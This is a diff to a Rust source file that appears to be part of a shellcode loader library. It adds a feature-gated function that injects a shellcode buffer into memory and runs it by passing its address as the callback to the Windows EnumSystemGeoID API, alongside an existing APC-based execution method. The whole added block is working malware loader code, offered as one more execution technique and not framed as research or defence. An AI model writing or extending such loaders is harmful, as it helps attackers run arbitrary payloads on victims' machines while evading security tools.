@@ -1685,3 +1685,47 @@ pub fn shellcode_execute_signalobjectandwaitapc(payload: Vec<u8>) -> bool {
         Err(_) => false,
     }
 }
+
+// =======================================================================================================
+// EXECUTION METHOD: EnumSystemGeoID
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+use windows_sys::Win32::Globalization::EnumSystemGeoID;
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+fn exec_payload_via_callback_func_enumsystemgeoid(start_address: *mut c_void) -> Result<(), String> {
+    
+    let result = unsafe {
+        EnumSystemGeoID(
+            16,  // GEOCLASS_NATION
+            0,   // All parent geographic locations
+            Some(std::mem::transmute(start_address))
+        )
+    };
+    
+    if result > 0 {
+        Ok(())
+    } else {
+        Err(String::from("EnumSystemGeoID failed"))
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+pub fn shellcode_execute_enumsystemgeoid(bytes_to_load: Vec<u8>) -> bool {
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumsystemgeoid(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        delay_execution();
+                    }
+                    true
+                }
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
